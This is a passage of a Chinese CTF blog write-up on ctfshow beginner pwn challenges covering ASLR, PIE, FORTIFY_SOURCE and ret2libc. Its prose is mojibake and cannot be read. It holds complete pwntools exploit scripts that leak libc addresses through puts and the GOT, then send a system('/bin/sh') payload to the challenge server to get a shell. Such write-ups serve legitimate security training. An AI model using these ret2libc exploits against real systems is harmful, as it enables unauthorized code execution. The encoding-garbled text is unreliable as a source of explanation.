äº†åˆ©ç”¨éš¾åº¦ã€‚ç„¶è€Œåœ¨å¢åŠ å®‰å…¨æ€§çš„åŒæ—¶ï¼ŒPIEä¹Ÿä¼šä¸€å®šç¨‹åº¦ä¸Šå½±å“æ€§èƒ½ï¼Œå› æ­¤åœ¨å¤§å¤šæ•°æ“ä½œç³»ç»Ÿä¸ŠPIEä»…ç”¨äºä¸€äº›å¯¹å®‰å…¨æ€§è¦æ±‚æ¯”è¾ƒé«˜çš„ç¨‹åºã€‚</p><p>ASLRå’ŒPIEå¼€å¯åï¼Œ</p><p>å¤§è‡´é€»è¾‘å°±æ˜¯ï¼Œå…ˆæŠŠ&#x2F;proc&#x2F;sts&#x2F;kernel&#x2F;randomize_va_spaceçš„å†…å®¹æ›´æ”¹ä¸º2ï¼Œä¹Ÿå°±æ˜¯å°†ASLRå…¨å¼€å¯ï¼Œç„¶åè¾“å‡ºäº†mainå‡½æ•°å’Œsystemå‡½æ•°çš„åœ°å€ï¼Œæœ‰è¾“å‡ºäº†å˜é‡çš„å †æ ˆçš„ä¿¡æ¯ï¼Œæœ€åæ‰“å°ä¸€æ¡æ¶ˆæ¯ï¼Œè¯´æ˜æ‰€æœ‰çš„ä¿æŠ¤æœºåˆ¶éƒ½å¼€äº†ï¼Œåœ°å€å…¨éƒ¨éƒ½æ˜¯éšæœºåŒ–çš„ï¼ç„¶åå°±ä¼šä¸ºæˆ‘ä»¬è¾“å‡ºflagäº†ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:/home/ctfshow/Desktop# ./pwn</span><br><span class="line">    â–„â–„â–„â–„   â–„â–„â–„â–„â–„â–„â–„â–„  â–„â–„â–„â–„â–„â–„â–„â–„            â–„â–„                           </span><br><span class="line">  â–ˆâ–ˆâ–€â–€â–€â–€â–ˆ  â–€â–€â–€â–ˆâ–ˆâ–€â–€â–€  â–ˆâ–ˆâ–€â–€â–€â–€â–€â–€            â–ˆâ–ˆ                           </span><br><span class="line"> â–ˆâ–ˆâ–€          â–ˆâ–ˆ     â–ˆâ–ˆ        â–„â–„â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–„  â–ˆâ–ˆâ–„â–ˆâ–ˆâ–ˆâ–ˆâ–„   â–„â–ˆâ–ˆâ–ˆâ–ˆâ–„  â–ˆâ–ˆ      â–ˆâ–ˆ</span><br><span class="line"> â–ˆâ–ˆ           â–ˆâ–ˆ     â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ   â–ˆâ–ˆâ–„â–„â–„â–„ â–€  â–ˆâ–ˆâ–€   â–ˆâ–ˆ  â–ˆâ–ˆâ–€  â–€â–ˆâ–ˆ â–€â–ˆ  â–ˆâ–ˆ  â–ˆâ–€</span><br><span class="line"> â–ˆâ–ˆâ–„          â–ˆâ–ˆ     â–ˆâ–ˆ         â–€â–€â–€â–€â–ˆâ–ˆâ–„  â–ˆâ–ˆ    â–ˆâ–ˆ  â–ˆâ–ˆ    â–ˆâ–ˆ  â–ˆâ–ˆâ–„â–ˆâ–ˆâ–„â–ˆâ–ˆ </span><br><span class="line">  â–ˆâ–ˆâ–„â–„â–„â–„â–ˆ     â–ˆâ–ˆ     â–ˆâ–ˆ        â–ˆâ–„â–„â–„â–„â–„â–ˆâ–ˆ  â–ˆâ–ˆ    â–ˆâ–ˆ  â–€â–ˆâ–ˆâ–„â–„â–ˆâ–ˆâ–€  â–€â–ˆâ–ˆ  â–ˆâ–ˆâ–€ </span><br><span class="line">    â–€â–€â–€â–€      â–€â–€     â–€â–€         â–€â–€â–€â–€â–€â–€   â–€â–€    â–€â–€    â–€â–€â–€â–€     â–€â–€  â–€â–€  </span><br><span class="line">    * *************************************                           </span><br><span class="line">    * Classify: CTFshow --- PWN --- å…¥é—¨                              </span><br><span class="line">    * Type  : Linux_Security_Mechanisms                               </span><br><span class="line">    * Site  : https://ctf.show/                                       </span><br><span class="line">    * Hint  : Please confirm your ASLR level first !                  </span><br><span class="line">    * *************************************                           </span><br><span class="line">Here is your ASLR level:</span><br><span class="line">2</span><br><span class="line">Let&#x27;s take a look at protection:</span><br><span class="line">[*] Checking for new versions of pwntools</span><br><span class="line">    To disable this functionality, set the contents of /root/.cache/.pwntools-cache-2.7/update to &#x27;never&#x27; (old way).</span><br><span class="line">    Or add the following lines to ~/.pwn.conf (or /etc/pwn.conf system-wide):</span><br><span class="line">        [update]</span><br><span class="line">        interval=never</span><br><span class="line">[*] A newer version of pwntools is available on pypi (4.2.1 --&gt; 4.12.0).</span><br><span class="line">    Update with: $ pip install -U pwntools</span><br><span class="line">[*] &#x27;/home/ctfshow/Desktop/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">executable: 0x55555555483a</span><br><span class="line">system@plt: 0x7ffff782d420</span><br><span class="line">heap: 0x555555757260</span><br><span class="line">stack: 0x7fffffffe324</span><br><span class="line">As you can see, the protection has been fully turned on and the address has been completely randomized!</span><br><span class="line">Here is your flag:</span><br><span class="line">ctfshow&#123;Address_Space_Layout_Randomization&amp;&amp;Position-Independent_Executable_1s_C0000000000l!&#125;</span><br></pre></td></tr></table></figure><h3 id="pwn30"><a href="#pwn30" class="headerlink" title="pwn30"></a>pwn30</h3><h5 id="å…³é—­PIEå-ç¨‹åºçš„åŸºåœ°å€å›ºå®šï¼Œæ”»å‡»è€…å¯ä»¥æ›´å®¹æ˜“åœ°ç¡®å®šå†…å­˜ä¸­å‡½æ•°å’Œå˜é‡çš„ä½ç½®ã€‚"><a href="#å…³é—­PIEå-ç¨‹åºçš„åŸºåœ°å€å›ºå®šï¼Œæ”»å‡»è€…å¯ä»¥æ›´å®¹æ˜“åœ°ç¡®å®šå†…å­˜ä¸­å‡½æ•°å’Œå˜é‡çš„ä½ç½®ã€‚" class="headerlink" title="å…³é—­PIEå ç¨‹åºçš„åŸºåœ°å€å›ºå®šï¼Œæ”»å‡»è€…å¯ä»¥æ›´å®¹æ˜“åœ°ç¡®å®šå†…å­˜ä¸­å‡½æ•°å’Œå˜é‡çš„ä½ç½®ã€‚"></a><strong>å…³é—­PIEå ç¨‹åºçš„åŸºåœ°å€å›ºå®šï¼Œæ”»å‡»è€…å¯ä»¥æ›´å®¹æ˜“åœ°ç¡®å®šå†…å­˜ä¸­å‡½æ•°å’Œå˜é‡çš„ä½ç½®ã€‚</strong></h5><p>ä¾æ—§æ˜¯ä¸€ä¸ªæº¢å‡ºæ¼æ´ï¼Œå†…å­˜å ç”¨æƒ…å†µå’Œpwn25ä¹Ÿæ˜¯ä¸€æ ·çš„</p><p>é‚£ä¹ˆå¯ä»¥åˆ©ç”¨å’Œpwn25ä¸€æ ·çš„expï¼Œåˆ©ç”¨ret2libcæ³„éœ²putså‡½æ•°çš„åœ°å€ï¼Œè¿›è€Œå‘é€payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">context.log_level = &#x27;debug&#x27;</span><br><span class="line"></span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;, &quot;28119&quot;)</span><br><span class="line">elf = ELF(&quot;./pwn&quot;)</span><br><span class="line"></span><br><span class="line">offset = 0x88 + 0x4</span><br><span class="line">main_addr = elf.symbols[&#x27;main&#x27;]</span><br><span class="line">puts_plt = elf.plt[&#x27;puts&#x27;]</span><br><span class="line">puts_got = elf.got[&#x27;puts&#x27;]</span><br><span class="line">payload = offset * b&#x27;a&#x27; + p32(puts_plt) + p32(main_addr) + p32(puts_got)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">puts_addr = u32(p.recv()[0:4])</span><br><span class="line">print(hex(puts_addr))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(&quot;puts&quot;, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(&quot;puts&quot;)</span><br><span class="line">print(hex(libc_base))</span><br><span class="line">system_addr = libc_base + libc.dump(&quot;system&quot;)</span><br><span class="line">binsh_addr = libc_base + libc.dump(&quot;str_bin_sh&quot;)</span><br><span class="line">payload = offset * b&#x27;a&#x27; + p32(system_addr) + b&#x27;a&#x27; * 4 + p32(binsh_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="pwn31"><a href="#pwn31" class="headerlink" title="pwn31"></a>pwn31</h3><h5 id="å¼€å¯-ASLR-å’Œ-PIE-çš„æƒ…å†µä¸‹ï¼Œä»å¯èƒ½è¢«åˆ©ç”¨"><a href="#å¼€å¯-ASLR-å’Œ-PIE-çš„æƒ…å†µä¸‹ï¼Œä»å¯èƒ½è¢«åˆ©ç”¨" class="headerlink" title="å¼€å¯ ASLR å’Œ PIE çš„æƒ…å†µä¸‹ï¼Œä»å¯èƒ½è¢«åˆ©ç”¨"></a>å¼€å¯ ASLR å’Œ PIE çš„æƒ…å†µä¸‹ï¼Œä»å¯èƒ½è¢«åˆ©ç”¨</h5><p>è™½ç„¶ç¨‹åºæ¯æ¬¡è¿è¡Œçš„åŸºå€ä¼šå˜,ä½†ç¨‹åºä¸­çš„å„æ®µçš„ç›¸å¯¹åç§»æ˜¯ä¸ä¼šå˜çš„ï¼Œåªè¦æ³„éœ²å‡ºæ¥ä¸€ä¸ªåœ°å€ï¼Œé€šè¿‡IDAé™æ€çš„çœ‹ä»–çš„ç¨‹åºåœ°å€,å°±èƒ½ç®—å‡ºåŸºå€,ä»è€Œå®ç°ç»•è¿‡ã€‚</p><p>è¿™é‡Œç¨‹åºä¸­æœ‰è¾“å‡ºmainå‡½æ•°åœ°å€çš„è¯­å¥ï¼Œé‚£ä¹ˆå°±å¾—åˆ°äº†è¿è¡Œæ—¶mainå‡½æ•°çš„åœ°å€ï¼Œå‡å»mainå‡½æ•°çš„é™æ€åœ°å€ï¼Œå°±æ˜¯å‡½æ•°åœ°å€çš„åç§»é‡äº†</p><p>ç”¨ç¨‹åºè¡¨ç¤ºå°±æ˜¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;, &quot;ç«¯å£å·&quot;)</span><br><span class="line">elf = ELF(&quot;./pwn&quot;)</span><br><span class="line">main_real_addr = int(p.recv().strip(),16)</span><br><span class="line">base_addr = main_real_addr - elf.sym[&#x27;main&#x27;]</span><br></pre></td></tr></table></figure><p>çŸ¥é“äº†å‡½æ•°åœ°å€åç§»é‡ï¼Œè¿˜éœ€è¦çŸ¥é“æº¢å‡ºçš„åç§»é‡ï¼Œè¾“å…¥ä¸‹é¢çš„å‘½ä»¤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gdb pwn      #ç”¨gdbæ‰“å¼€æ–‡ä»¶</span><br><span class="line">cyclic 200     #è¾“å‡º200ä¸ªæ— ç”¨å­—ç¬¦</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¾“å‡ºäº†200ä¸ªæ— ç”¨å­—ç¬¦ï¼Œéƒ½å¤åˆ¶ä¸‹æ¥</p><p>å†è¾“å…¥rè¿è¡Œç¨‹åºï¼Œå¯ä»¥çœ‹åˆ°mainå‡½æ•°çš„åœ°å€è¢«è¾“å‡ºäº†ã€‚æ¥ç€å°†åˆšæ‰å¤åˆ¶çš„200ä¸ªå­—ç¬¦ç²˜è´´ä½œä¸ºè¾“å…¥ï¼Œå¯ä»¥çœ‹åˆ°åˆè¾“å‡ºäº†ä¸€ä¸ªåœ°å€å¹¶æŠ¥é”™äº†ï¼Œè¿™æ˜¯å› ä¸ºæ ˆæº¢å‡ºï¼Œç¨‹åºç»™å‡ºäº†ä¸€ä¸ªæ— æ•ˆåœ°å€ï¼Œè€Œè¿™ä¸ªåœ°å€å°±æ˜¯è¢«è¦†ç›–åçš„ctfshowå‡½æ•°çš„è¿”å›åœ°å€</p><p>å†è¾“å…¥cyclic -l 0x6261616bå°±èƒ½å¾—åˆ°æ ˆæº¢å‡ºçš„åç§»é‡ï¼Œæ˜¯140</p><p>ç”±æ­¤å¾—åˆ°äº†ä¸¤ä¸ªæ•°æ®ï¼Œä¸€ä¸ªæ˜¯å‡½æ•°åœ°å€çš„åç§»é‡ï¼Œä¸€ä¸ªæ˜¯æ ˆæº¢å‡ºçš„åç§»é‡ï¼Œæ ¹æ®è¿™ä¸¤ä¸ªæ•°æ®æ”¹å†™ä¹‹å‰çš„ret2libcè„šæœ¬ï¼Œä¸‹é¢æ˜¯å…¶ä»–åšå®¢é‡Œpyæ¥çš„exp</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line"></span><br><span class="line">p = remote(&quot;pwn.challenge.ctf.show&quot;, 28173)</span><br><span class="line">elf = ELF(&quot;./pwn&quot;)</span><br><span class="line"></span><br><span class="line">main_real_addr = int(p.recv().strip(), 16)</span><br><span class="line">print(hex(main_real_addr))</span><br><span class="line">base_addr = main_real_addr - elf.sym[&#x27;main&#x27;]</span><br><span class="line"># è·å¾—äº†å†…å­˜ä¸­çœŸå®çš„mainåœ°å€ï¼Œå†å‡å»ç¨‹åºä¸­çš„mainå‡½æ•°çš„åœ°å€å°±èƒ½å¾—åˆ°ç¨‹åºä¸­å‡½æ•°åœ¨å†…å­˜ä¸­çš„åç§»</span><br><span class="line"></span><br><span class="line">puts_plt = base_addr + elf.sym[&#x27;puts&#x27;]</span><br><span class="line">puts_got = base_addr + elf.got[&#x27;puts&#x27;]</span><br><span class="line">ctfshow_addr = base_addr + elf.sym[&#x27;ctfshow&#x27;]</span><br><span class="line">ebx = base_addr + 0x1fc0</span><br><span class="line">payload = 132 * b&#x27;a&#x27; + p32(ebx) + 4 * b&#x27;a&#x27; + p32(puts_plt) + p32(main_real_addr) + p32(puts_got)</span><br><span class="line">p.send(payload)</span><br><span class="line">puts_addr = u32(p.recv()[0:4])</span><br><span class="line">print(hex(puts_addr))</span><br><span class="line"># é€šè¿‡gotè¡¨ä¸­putså‡½æ•°çš„åœ°å€æ‰“å°å‡ºputså‡½æ•°çœŸå®çš„åœ°å€</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(&quot;puts&quot;, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)</span><br><span class="line">system_addr = libc_base + libc.dump(&quot;system&quot;)</span><br><span class="line">binsh_addr = libc_base + libc.dump(&quot;str_bin_sh&quot;)</span><br><span class="line"># æ‰¾åˆ°libcï¼Œé€šè¿‡libcæ‰¾åˆ°systemã€/bin/sh</span><br><span class="line"></span><br><span class="line">payload = 140 * b&#x27;a&#x27; + p32(system_addr) + p32(ctfshow_addr) + p32(binsh_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>å¯¹äºä¸Šé¢çš„expï¼Œä»¥ä¸‹ä¸ºè¯¦è§£ï¼š</p><p>1.ä¸æœåŠ¡å™¨å»ºç«‹è¿æ¥åå…ˆåˆ©ç”¨mainå‡½æ•°è·å¾—å‡½æ•°åœ°å€çš„åç§»é‡base_addrï¼Œä¹Ÿå°±æ˜¯æ‰€è°“çš„åŸºå€</p><p>2.åˆ©ç”¨åŸºå€å¾—åˆ°putså‡½æ•°åœ¨pltå’Œgotè¡¨ä¸­çš„çœŸå®åœ°å€</p><p>3.å‘é€payloadï¼Œåˆ©ç”¨gotè¡¨å¾—åˆ°putså‡½æ•°çœŸå®çš„åœ°å€</p><p>4.åˆ©ç”¨putså‡½æ•°çš„çœŸå®åœ°å€å¾—åˆ°libcåº“çš„åŸºå€ï¼Œè¿›è€Œå¾—åˆ°libcåº“ä¸­systemå‡½æ•°å’Œ&#x2F;bin&#x2F;shçš„åœ°å€</p><p>5.å†æ¬¡å‘é€payloadè·å¾—shell</p><p>å…¶ä¸­ç¬¬ä¸€ä¸ªpayloadå‡ºç°äº†ebxï¼Œè¿™æ˜¯å› ä¸ºctfshowå‡½æ•°çš„æœ€åæœ‰ä¸€æ¡movæŒ‡ä»¤ï¼Œå…¶ä¸­çš„ebxå¯„å­˜å™¨ä¸èƒ½è¢«è¦†ç›–ï¼Œæ‰€ä»¥éœ€è¦å°†å…¶çœŸå®çš„åœ°å€æ”¾åˆ°payloadä¸­ã€‚ebxæ˜¯ç”±__x86.get_pc_thunk.bxå¾—åˆ°çš„ï¼Œå®ƒå°†ä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€èµ‹ç»™ebxå¯„å­˜å™¨ï¼Œç„¶åé€šè¿‡åŠ ä¸Šä¸€ä¸ªåç§»ï¼Œå¾—åˆ°å½“å‰è¿›ç¨‹GOTè¡¨çš„åœ°å€ï¼Œå¹¶ä»¥æ­¤ä½œä¸ºåç»­æ“ä½œçš„åŸºåœ°å€ã€‚</p><p>ç”¨readelf -S pwnå‘½ä»¤å¯ä»¥çŸ¥é“gotè¡¨çš„åˆå§‹åœ°å€ä¸º0x001fc0ï¼Œå› æ­¤ebxçš„çœŸå®åœ°å€ä¸ºbase_addr + 0x1fc0</p><p>è¿è¡Œè„šæœ¬å¾—åˆ°flag</p><h3 id="pwn32"><a href="#pwn32" class="headerlink" title="pwn32"></a>pwn32</h3><h5 id="FORTIFY-SOURCE-x3D-0ï¼š-ç¦ç”¨-Fortify-åŠŸèƒ½ã€‚-ä¸ä¼šè¿›è¡Œä»»ä½•é¢å¤–çš„å®‰å…¨æ£€æŸ¥ã€‚-å¯èƒ½å¯¼è‡´æ½œåœ¨çš„å®‰å…¨æ¼æ´ã€‚"><a href="#FORTIFY-SOURCE-x3D-0ï¼š-ç¦ç”¨-Fortify-åŠŸèƒ½ã€‚-ä¸ä¼šè¿›è¡Œä»»ä½•é¢å¤–çš„å®‰å…¨æ£€æŸ¥ã€‚-å¯èƒ½å¯¼è‡´æ½œåœ¨çš„å®‰å…¨æ¼æ´ã€‚" class="headerlink" title="FORTIFY_SOURCE&#x3D;0ï¼š ç¦ç”¨ Fortify åŠŸèƒ½ã€‚ ä¸ä¼šè¿›è¡Œä»»ä½•é¢å¤–çš„å®‰å…¨æ£€æŸ¥ã€‚ å¯èƒ½å¯¼è‡´æ½œåœ¨çš„å®‰å…¨æ¼æ´ã€‚"></a>FORTIFY_SOURCE&#x3D;0ï¼š ç¦ç”¨ Fortify åŠŸèƒ½ã€‚ ä¸ä¼šè¿›è¡Œä»»ä½•é¢å¤–çš„å®‰å…¨æ£€æŸ¥ã€‚ å¯èƒ½å¯¼è‡´æ½œåœ¨çš„å®‰å…¨æ¼æ´ã€‚</h5><p>æˆ‘ä»¬å…ˆæ¥åˆ†æä¸€ä¸‹ä»£ç çš„é€»è¾‘ï¼š ç¨‹åºæ‰“å°å‡ºlogoçš„ä¿¡æ¯ï¼Œç„¶åç„¶åå°†ç¬¬ä¸€ä¸ªå‚æ•°argv[1]ä¹Ÿå°±æ˜¯æˆ‘ä»¬å¯åŠ¨ç¨‹åºè¾“å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°(å…¶å®è¿˜æœ‰argv[0]çš„ï¼Œè¿™ä¸ªå‚æ•°æ˜¯æ¯ä¸ªç¨‹åºçš„éƒ½ä¸€å®šä¼šæœ‰çš„ï¼Œå¹¶ä¸”å€¼ä¸ºç¨‹åºåç§°)èµ‹ç»™v4ï¼Œå¹¶ä¸”æ²¡æœ‰é•¿åº¦é™åˆ¶ã€‚ä¹‹åç¨‹åºå°†v4[10]çš„æ•°ç»„å†…å®¹èµ‹ç»™buf1[10]æ•°ç»„ï¼Œå†å°†CTFshowPWNé€šè¿‡strcpyå‡½æ•°èµ‹ç»™buf2ï¼Œæ¥ç€æ‰“å°è¾“å‡ºbuf1å’Œbuf2ã€‚å†ç„¶åé€šè¿‡strtol(argv[3], 0LL, 10)å°†æˆ‘ä»¬å¯åŠ¨ç¨‹åºä¼ å…¥çš„ç¬¬ä¸‰ä¸ªå‚æ•°è½¬ä¸º10è¿›åˆ¶èµ‹ç»™v5ï¼Œç´§æ¥ç€ä½¿ç”¨memcpyå‡½æ•°å°†argv2çš„v5ä¸ªå­—ç¬¦èµ‹ç»™buf1ï¼Œv5æ˜¯intå‹ï¼Œæ•°å€¼å°±æ˜¯ä¸Šæ¡è¯­å¥çš„å¾—æ¥çš„ï¼›ç„¶åå†é€šè¿‡strcpyå‡½æ•°argv[1]æˆ‘ä»¬è¾“å…¥ç¬¬ä¸€ä¸ªå‚æ•°èµ‹ç»™buf2ï¼Œä¹‹åå†æ‰“å°è¾“å‡ºbuf1å’Œbuf2ï¼Œæœ€åè¯»å–_bss_start 11ä¸ªå­—ç¬¦ç»™buf1ï¼Œæ‰“å°è¾“å‡ºbuf1å’Œnumçš„ä¿¡æ¯ã€‚æœ€æœ€åé€šè¿‡ifåˆ¤æ–­argcæ˜¯å¦å¤§äº4(é»˜è®¤æƒ…å†µä¸‹argcæ˜¯ç­‰äº1çš„ï¼Œå› ä¸ºargv[0]å¿…å®šå­˜åœ¨ï¼Œæˆ‘ä»¬è¾“å…¥ä¸€ä¸ªå‚æ•°ï¼Œargcå°±ä¼šç­‰äº2ï¼Œä¾æ¬¡é€’æ¨)ï¼Œå¦‚æœå¤§äº4ï¼Œå°±ä¼šè¿›å…¥Undefinedå‡½æ•°ï¼ŒUndefinedå‡½æ•°çš„ä½œç”¨å°±æ˜¯è¾“å‡ºflagäº†ã€‚</p><p>å› ä¸ºæœ¬é¢˜ç›®FORTIFY_SOURCEæ²¡æœ‰å¼€å¯ï¼Œä»£è¡¨æˆ‘ä»¬å¯åŠ¨å‡½æ•°ç›´æ¥è¾“å…¥4ä¸ªå‚æ•°(è¿™æ—¶argc&#x3D;5 &gt; 4)å°±è¡Œäº†ï¼Œè€Œä¸”è¿™4ä¸ªå‚æ•°æ²¡æœ‰é•¿åº¦é™åˆ¶ï¼Œå¦‚æœå¼€å¯FORTIFY_SOURCEå°±ä¸å¥½è¯´äº†ï¼Œå› ä¸ºå¼€å¯äº†ä¹‹åï¼Œç”±äºç¨‹åºå­˜åœ¨strcpyå’Œmemcpyå‡½æ•°ä¼šæ£€æµ‹é•¿åº¦ï¼Œå¦‚æœé•¿åº¦è¶…è¿‡äº†é™åˆ¶ï¼Œå¯èƒ½ä¼šä½¿ç¨‹åºæŠ›å‡ºå¼‚å¸¸è€Œé€€å‡ºæ‰§è¡Œã€‚</p><p>é‚£ä¹ˆè¿™é“é¢˜ç›®æˆ‘ä»¬å°±ç›´æ¥è¾“å…¥4ä¸ªå‚æ•°å°±è¡Œäº†ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./pwnme 1 2 3 4</span><br></pre></td></tr></table></figure><p>è¿™æ—¶ç¨‹åºä¼šåœåœ¨è¿™é‡Œï¼Œæˆ‘ä»¬ç›´æ¥ä¸€ä¸ªå›è½¦å°±è¡Œäº†ã€‚</p><h3 id="pwn33"><a href="#pwn33" class="headerlink" title="pwn33"></a>pwn33</h3><p>memcpyå’Œstrcpyè¿™ä¸¤ä¸ªå‡½æ•°è¢«æ›¿æ¢æˆäº†<strong>mencpy_chkå’Œ</strong>strcpy__chkå®‰å…¨å‡½æ•°ï¼Œå¯ä»¥çœ‹åˆ°è¿™ä¸¤ä¸ªå‡½æ•°ç›¸æ¯”å‰ä¸¤ä¸ªå‡½æ•°åªæ˜¯åŠ ä¸Šäº†11LLè¿™ä¸ªå‚æ•°åŠ ä»¥é™åˆ¶ï¼Œå› ä¸ºbuf1å’Œbuf2åœ¨å£°æ˜çš„æ—¶å€™çš„é•¿åº¦å°±æ˜¯11ï¼Œæ‰€ä»¥ç¨‹åºä¸ºäº†é˜²æ­¢æº¢å‡ºï¼Œä½¿ç”¨åä¸¤ä¸ªå‡½æ•°åŠ ä¸Šè¿™ä¸¤ä¸ªæ•°ç»„çš„é•¿åº¦åŠ ä»¥é™åˆ¶ä»¥é˜²æº¢å‡ºã€‚</p><p>æˆ‘ä»¬å°±ä¿è¯æˆ‘ä»¬è¾“å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°å’Œç¬¬äºŒä¸ªå‚æ•°çš„é•¿åº¦ä¸è¶…è¿‡11å°±è¡Œäº†å•Šï¼Œåªæ˜¯ä¸Šåˆ°é¢˜ç›®æ²¡æœ‰å¼€å¯FORTIFY_SOURCEï¼Œæˆ‘ä»¬è¾“å…¥å‚æ•°çš„é•¿åº¦æ˜¯ä»»æ„çš„ï¼Œè¿™é“é¢˜ç›®å¯¹æˆ‘ä»¬çš„å‚æ•°åŠ ä»¥é™åˆ¶äº†è€Œä»¥ã€‚</p><p>æˆ‘ä»¬ç›´æ¥sshè¿æ¥ï¼Œè¿è¡ŒpwnmeåŠ ä¸Šä¸è¶…è¿‡11é•¿åº¦çš„4ä¸ªå‚æ•°å°±è¡Œäº†(ä¸»è¦æ˜¯å‚æ•°1å’Œå‚æ•°2ä¸è¶…è¿‡11)ï¼Œé‚£æˆ‘ä»¬å°±å’Œä¸Šé“é¢˜ç›®ä¸€æ ·æ¯ä¸ªå‚æ•°é•¿åº¦éƒ½ä¸º1å‘—ã€‚</p><h3 id="pwn34"><a href="#pwn34" class="headerlink" title="pwn34"></a>pwn34</h3><p>FORTIFY_SOURCE&#x3D;2ï¼š å¯ç”¨ Fortify åŠŸèƒ½çš„é«˜çº§çº§åˆ«ã€‚ åŒ…æ‹¬åŸºæœ¬çº§åˆ«çš„å®‰å…¨æ£€æŸ¥ï¼Œå¹¶æ·»åŠ äº†æ›´å¤šçš„æ£€æŸ¥ã€‚ åœ¨ç¼–è¯‘æ—¶è¿›è¡Œæ›´ä¸¥æ ¼çš„æ£€æŸ¥ï¼Œå¦‚æ›´ç²¾ç¡®çš„ç¼“å†²åŒºè¾¹ç•Œæ£€æŸ¥ã€‚ æä¾›æ›´ä¸°å¯Œçš„ç¼–è¯‘å™¨è­¦å‘Šå’Œé”™è¯¯ä¿¡æ¯ã€‚</p><p><strong>mencpy_chkå’Œ</strong>strcpy<strong>chkå®‰å…¨å‡½æ•°ä¸Šé“é¢˜ç›®å·²ç»è¯´è¿‡ä¸memcpyå’Œstrcpyçš„åŒºåˆ«ï¼Œè¿™é‡Œä¸å†èµ˜è¿°ã€‚</strong> printf__chkè¯¥å‡½æ•°ä¸printfçš„åŒºåˆ«åœ¨äºï¼š ä¸èƒ½ä½¿ç”¨ %x$n ä¸è¿ç»­åœ°æ‰“å°ï¼Œä¹Ÿå°±æ˜¯è¯´å¦‚æœè¦ä½¿ç”¨ %3$nï¼Œåˆ™å¿…é¡»åŒæ—¶ä½¿ç”¨ %1$n å’Œ %2$nã€‚åœ¨ä½¿ç”¨ %n çš„æ—¶å€™ä¼šåšä¸€äº›æ£€æŸ¥ã€‚ è¿™ä¸ªæ¶‰åŠåˆ°æ 